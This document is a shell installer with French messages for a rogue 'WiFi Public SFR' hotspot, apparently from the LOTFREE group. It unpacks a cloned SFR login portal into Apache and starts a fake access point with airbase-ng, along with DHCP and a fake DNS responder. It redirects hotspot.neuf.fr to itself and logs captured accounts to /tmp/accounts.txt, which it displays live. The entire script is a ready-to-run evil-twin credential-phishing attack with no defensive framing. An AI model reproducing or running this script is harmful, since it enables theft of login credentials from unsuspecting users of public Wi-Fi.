#!/bin/sh -e
echo "  .:[ LOTFREE - ROGUE SFR HOTSPOT ]:."
sed -e '1,/^exit$/d' "$0" | tar xzf -
cd sfrpack
echo "[!] Copie des fichiers..."
mv sites-available/* /etc/apache2/sites-available/
mv "Portail SFR WiFi_files" /var/www/
mv index.html /var/www/
mv nb4_crypt.php /var/www/
mv 404.php /var/www/
echo "[!] Installation du demon DHCP..."
dpkg -i dhcp3-server_3.1.3-2ubuntu3.2_i386.deb
mv dhcpd.conf /etc/dhcp3/
/etc/init.d/dhcp3-server stop
killall dhclient3
echo "[!] Mise en place du hotspot..."
airmon-ng start wlan0
airbase-ng -e "WiFi Public SFR" -c 11 mon0&
sleep 5
ifconfig at0 up
ifconfig at0 192.168.1.1 netmask 255.255.255.0
echo "[!] Lancement du serveur DHCP..."
dhcpd3 -cf /etc/dhcp3/dhcpd.conf -pf /tmp/plop.pid at0
echo "[!] Configuration d'Apache..."
echo "192.168.1.1 hotspot.neuf.fr" >> /etc/hosts
a2enmod ssl
a2ensite default-ssl
a2ensite hotspot
/etc/init.d/apache2 start
chmod +x fakedns.pl
./fakedns.pl&
echo "[!] Enregistrement des accounts dans /tmp/accounts.txt..."
echo "[!] Affichage sur la console :"
touch /tmp/accounts.txt
chmod o+w /tmp/accounts.txt
tail -f /tmp/accounts.txt
exit
